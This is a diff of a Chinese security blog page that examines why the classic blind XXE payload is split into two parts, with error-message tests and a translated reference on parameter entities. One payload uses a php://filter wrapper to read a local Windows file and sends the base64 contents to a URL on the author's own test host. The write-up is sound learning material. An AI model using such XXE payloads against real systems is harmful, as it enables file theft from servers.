@@ -14,18 +14,18 @@
 <meta property="og:site_name" content="回忆飘如雪">
 <meta property="og:description" content="payload1是xxe一个经典payload。一般用于无回显的blind xxe。但是问题来了，为何Payload作者将payload内容分两部分（比如像payload1这样），而不是将所有攻击实体放到一个payload中（比如像payload2这样）。注意：Blind XXE是没有回显的，为了测试方便，我将payload有回显的显示了。 测试代码12345678&amp;lt;?phplibxml_d">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://gv7.me/.me//my_payload_1.png">
-<meta property="og:image" content="http://gv7.me/.me//my_payload_2.png">
-<meta property="og:image" content="http://gv7.me/.me//payload_2_x25.png">
-<meta property="og:image" content="http://gv7.me/.me//english_article.png">
-<meta property="og:image" content="http://gv7.me/.me//english_article_xml_1.png">
-<meta property="og:image" content="http://gv7.me/.me//english_article_xml_2.png">
-<meta property="og:image" content="http://gv7.me/.me//english_article_xml_3.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/my_payload_1.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/my_payload_2.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/payload_2_x25.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/english_article.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/english_article_xml_1.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/english_article_xml_2.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/english_article_xml_3.png">
 <meta property="og:updated_time" content="2019-02-16T18:04:01.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Blind XXE经典payload引发的脑洞">
 <meta name="twitter:description" content="payload1是xxe一个经典payload。一般用于无回显的blind xxe。但是问题来了，为何Payload作者将payload内容分两部分（比如像payload1这样），而不是将所有攻击实体放到一个payload中（比如像payload2这样）。注意：Blind XXE是没有回显的，为了测试方便，我将payload有回显的显示了。 测试代码12345678&amp;lt;?phplibxml_d">
-<meta name="twitter:image" content="http://gv7.me/.me//my_payload_1.png">
+<meta name="twitter:image" content="http://gv7.me/articles/2018/think-about-blind-xxe-payload/my_payload_1.png">
     
     
         
@@ -175,19 +175,19 @@
 </ul>
 <p>我在payload1能执行成功的情况下，有测试了payload2。结果令人失望，没有成功。难道原因是payload作者也想把所有攻击内容放在一个payload只是这样无法执行成功？网上看了一下全是清一色的经典payload的样式。看来只有我来自己构造一个能实现payload1功能,同时包含所有攻击代码的payload了。</p>
 <h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><p>第一个想是通过查看错误信息来找原因。</p>
-<p><img src="/.me//my_payload_1.png" alt></p>
+<p><img src="/articles/2018/think-about-blind-xxe-payload/my_payload_1.png" alt></p>
 <p>报错<code>PEReferences forbidden in internal subset in Entity</code></p>
 <p>根据报错，我将<code>http://127.0.0.1/?%file;</code>中的%编码为&#25;</p>
-<p><img src="/.me//my_payload_2.png" alt></p>
+<p><img src="/articles/2018/think-about-blind-xxe-payload/my_payload_2.png" alt></p>
 <p>还是报错<code>Invalid URI: http://127.0.0.1/?&amp;#x25; in Entity</code>,说明<code>&amp;#x25;file</code>只是变成了%file，但是%file没有解析为实体file的值。</p>
 <p>我又将第二个实体中的SYSTEM去掉，也就是第二个实体我声明为内部实体，结果<code>&amp;#x25;file</code>成功解析为实体file内容。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send &apos;http://127.0.0.1/?&amp;#x25;file;&apos;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;send;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//payload_2_x25.png" alt></p>
+<p><img src="/articles/2018/think-about-blind-xxe-payload/payload_2_x25.png" alt></p>
 <p>这令我很是不解，为何内部声明&#x25;file能够成功解析，为何外部声明时不行？我暂时理解为，外部声明需要多一个步骤URL合法性检验。说明在%file还没有被解析为file实体值时，URL合法性检验就开始了。而是在HTTP协议中%与url编码中的%有冲突了。</p>
 <p>然而一切都是我的猜想而已。想了一下，xml解析器是在php内部，无法知道它解析一个xml的具体细节。除非我可以调式源代码（目前没有这能力。），那下面我只能看看，有没有权威的文档去解释这个问题了。</p>
 <h2 id="权威文档"><a href="#权威文档" class="headerlink" title="权威文档"></a>权威文档</h2><p>《XML Schema,DTD,and Entity Attacks》一文中有关XXE和参数实体的部分。</p>
-<p><img src="/.me//english_article.png" alt="英文资料"></p>
+<p><img src="/articles/2018/think-about-blind-xxe-payload/english_article.png" alt="英文资料"></p>
 <p>书到用时方恨少，读然好想写英语。这次只能借助百度翻译和有道翻译了。下面是针对于英文材料翻译和我的一些理解。</p>
 <p>参数实体是一种特殊类型的实体，它只能在DTD定义本身中使用。这些实体与文档实体的定义基本相同，但它们的行为更像(但不完全像)代码宏，并允许使用它们。<br>更灵活的DTD定义。考虑以下内容，其中的an-element被定义为一个常规参数实体，<br>远程dtd被定义为一个外部参数实体:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%an-element;</span><br><span class="line">%remote-dtd;</span><br></pre></td></tr></table></figure>
@@ -197,9 +197,9 @@
 
 <p>然而，如果实体引用存在于子DTD中，这种样式的语法通常会成功。也就是说，如果文档的DTD引用外部实体，包括使用参数实体引用的外部文档的值，并且外部文档引用前面定义的实体，那么动态构建的DTD标记将被解释为人们所期望的。</p>
 <p>以上是对英文材料的翻译。下面是我的理解。通过将英文文档中的第一例子提交到我们的本地测试靶机，发现没有保存，可以正常打印xml对象，说明解析成功。</p>
-<p><img src="/.me//english_article_xml_1.png" alt="英文文章第一例子，可以解析"></p>
+<p><img src="/articles/2018/think-about-blind-xxe-payload/english_article_xml_1.png" alt="英文文章第一例子，可以解析"></p>
 <p>但是第二个就通常可能无法解析。</p>
-<p><img src="/.me//english_article_xml_2.png" alt="英文文章第二例子，无法解析"></p>
+<p><img src="/articles/2018/think-about-blind-xxe-payload/english_article_xml_2.png" alt="英文文章第二例子，无法解析"></p>
 <p>文章说第二例子通常是无法解析的，并没有说一定无法解析。说明大部分情况下是无法解析的，因为xml的解析器在php,java,C#等等中情况会有一些不一样。我们暂且认为文章中第二个xml就是无法解析吧！</p>
 <p>按照文章的意思，如果文档的DTD引用外部实体，包括使用参数实体引用的外部文档的值，并且外部文档引用前面定义的实体，那么动态构建的DTD标记将被解释为人们所期望的。</p>
 <p>于是我将第二个xml写为</p>
@@ -208,7 +208,7 @@
 <p>remote.dtd</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT mytag (%pm;)&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.me//english_article_xml_3.png" alt="对英文文章第二例子的改正"></p>
+<p><img src="/articles/2018/think-about-blind-xxe-payload/english_article_xml_3.png" alt="对英文文章第二例子的改正"></p>
 <p>这样之后不在报错。</p>
 <p>现在回到本文的问题，我们想构造的payload其实道理和英文材料中的第二个xml很相似。<br>我们在上面声明% file实体，在下一行就直接通过%file;使用它，按照英文材料的意思这样通常是解析不成功的。那么我们通过<code>错误信息</code>章节中遇到的内部声明<code>&amp;#x25;file</code>可以解析，而外部声明为何无法解析。也许这就是英文材料中说的通常的情况的例外。我承认这解释有点不负责任，没有论证。所以等到有能力可以调式php源码时，才深挖真正的原因吧。</p>
 <p>最后说一下目前的结论吧。虽然一不定是正确的，至少是可以让我能暂时安心睡觉的一个解释。 <strong>payload作者之所以把paylaod内容分两部分写，是因为无法实现分一部分写。分一部分写，无法让payload执行成功！</strong></p>
